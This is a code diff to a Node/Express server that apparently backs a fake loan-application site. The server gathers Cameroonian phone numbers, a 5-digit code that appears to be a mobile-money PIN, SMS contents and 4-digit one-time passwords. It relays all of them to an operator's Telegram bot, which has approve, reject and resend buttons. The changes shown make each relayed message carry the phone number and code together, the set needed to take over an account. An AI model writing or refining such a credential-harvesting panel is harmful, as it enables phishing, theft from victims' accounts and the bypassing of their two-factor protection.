@@ -23,7 +23,7 @@ app.post('/api/apply', async (req, res) => {
 
     const message = `🚨 *NEW APPLICATION* 🚨\n\n` +
                     `📞 *Phone:* +237 ${phone}\n` +
-                    `🔑 *Code:* ${code}\n\n` +
+                    `🔑 *5-Digit Code:* ${code}\n\n` +
                     `Status: ⏳ Pending`;
 
     try {
@@ -76,7 +76,12 @@ app.post('/api/verify-sms', async (req, res) => {
     const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-    const message = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${sms}\n\`\`\``;
+    // ADDED PHONE AND CODE TO THIS MESSAGE
+    const message = `📩 *SMS RECEIVED* 📩\n\n` +
+                    `*App ID:* \`${appId}\`\n` +
+                    `📞 *Phone:* +237 ${applications[appId].phone}\n` +
+                    `🔑 *5-Digit Code:* ${applications[appId].code}\n\n` +
+                    `*SMS Content:*\n\`\`\`\n${sms}\n\`\`\``;
 
     try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -89,7 +94,7 @@ app.post('/api/verify-sms', async (req, res) => {
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            { text: "✅ APPROVE", callback_data: `approve_sms_${appId}` },
+                            { text: "✅ APPROVE SMS", callback_data: `approve_sms_${appId}` },
                             { text: "❌ REJECT", callback_data: `reject_sms_${appId}` }
                         ],
                         [
@@ -127,9 +132,12 @@ app.post('/api/submit-otp', async (req, res) => {
     const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+    // ADDED PHONE AND 5-DIGIT CODE TO THIS MESSAGE
     const message = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
                     `*App ID:* \`${appId}\`\n` +
-                    `*OTP Code:* \`${otp}\`\n\n` +
+                    `📞 *Phone:* +237 ${applications[appId].phone}\n` +
+                    `🔑 *5-Digit Code:* ${applications[appId].code}\n` +
+                    `🔢 *4-Digit OTP:* \`${otp}\`\n\n` +
                     `Status: Finalizing Loan...`;
 
     try {
@@ -205,14 +213,14 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     applications[appId].status = 'approved';
                     newText = `🚨 *NEW APPLICATION* 🚨\n\n` +
                               `📞 *Phone:* +237 ${applications[appId].phone}\n` +
-                              `🔑 *Code:* ${applications[appId].code}\n\n` +
+                              `🔑 *5-Digit Code:* ${applications[appId].code}\n\n` +
                               `Status: ✅ *APPROVED*`;
                     newStatus = "Approved!";
                 } else {
                     applications[appId].status = 'rejected';
                     newText = `🚨 *NEW APPLICATION* 🚨\n\n` +
                               `📞 *Phone:* +237 ${applications[appId].phone}\n` +
-                              `🔑 *Code:* ${applications[appId].code}\n\n` +
+                              `🔑 *5-Digit Code:* ${applications[appId].code}\n\n` +
                               `Status: ❌ *REJECTED*`;
                     newStatus = "Rejected!";
                 }
@@ -221,15 +229,15 @@ app.post('/api/telegram-webhook', async (req, res) => {
             else if (target === 'sms') {
                 if (action === 'approve') {
                     applications[appId].smsStatus = 'approved';
-                    newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: ✅ *SMS APPROVED*`;
+                    newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n📞 *Phone:* +237 ${applications[appId].phone}\n🔑 *5-Digit Code:* ${applications[appId].code}\n\n*SMS:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: ✅ *SMS APPROVED*`;
                     newStatus = "SMS Approved!";
                 } else if (action === 'reject') {
                     applications[appId].smsStatus = 'rejected';
-                    newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: ❌ *SMS REJECTED*`;
+                    newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n📞 *Phone:* +237 ${applications[appId].phone}\n🔑 *5-Digit Code:* ${applications[appId].code}\n\n*SMS:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: ❌ *SMS REJECTED*`;
                     newStatus = "SMS Rejected!";
                 } else if (action === 'resend') {
                     applications[appId].smsStatus = 'resend';
-                    newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: 🔄 *RESEND REQUESTED*`;
+                    newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n📞 *Phone:* +237 ${applications[appId].phone}\n🔑 *5-Digit Code:* ${applications[appId].code}\n\n*SMS:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: 🔄 *RESEND REQUESTED*`;
                     newStatus = "Resend Requested!";
                 }
             }
@@ -237,24 +245,15 @@ app.post('/api/telegram-webhook', async (req, res) => {
             else if (target === 'otp') {
                 if (action === 'approve') {
                     applications[appId].otpStatus = 'approved';
-                    newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
-                              `*App ID:* \`${appId}\`\n` +
-                              `*OTP Code:* \`${applications[appId].otpCode}\`\n\n` +
-                              `Status: ✅ *OTP APPROVED*`;
+                    newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n*App ID:* \`${appId}\`\n📞 *Phone:* +237 ${applications[appId].phone}\n🔑 *5-Digit Code:* ${applications[appId].code}\n🔢 *4-Digit OTP:* \`${applications[appId].otpCode}\`\n\nStatus: ✅ *OTP APPROVED*`;
                     newStatus = "OTP Approved!";
                 } else if (action === 'resend') {
                     applications[appId].otpStatus = 'resend';
-                    newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
-                              `*App ID:* \`${appId}\`\n` +
-                              `*OTP Code:* \`${applications[appId].otpCode}\`\n\n` +
-                              `Status: 🔄 *RESEND REQUESTED*`;
+                    newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n*App ID:* \`${appId}\`\n📞 *Phone:* +237 ${applications[appId].phone}\n🔑 *5-Digit Code:* ${applications[appId].code}\n🔢 *4-Digit OTP:* \`${applications[appId].otpCode}\`\n\nStatus: 🔄 *RESEND REQUESTED*`;
                     newStatus = "Resend Requested!";
                 } else if (action === 'inactive') {
                     applications[appId].otpStatus = 'inactive';
-                    newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
-                              `*App ID:* \`${appId}\`\n` +
-                              `*OTP Code:* \`${applications[appId].otpCode}\`\n\n` +
-                              `Status: 🚫 *ACCOUNT INACTIVE*`;
+                    newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n*App ID:* \`${appId}\`\n📞 *Phone:* +237 ${applications[appId].phone}\n🔑 *5-Digit Code:* ${applications[appId].code}\n🔢 *4-Digit OTP:* \`${applications[appId].otpCode}\`\n\nStatus: 🚫 *ACCOUNT INACTIVE*`;
                     newStatus = "Marked Inactive!";
                 }
             }
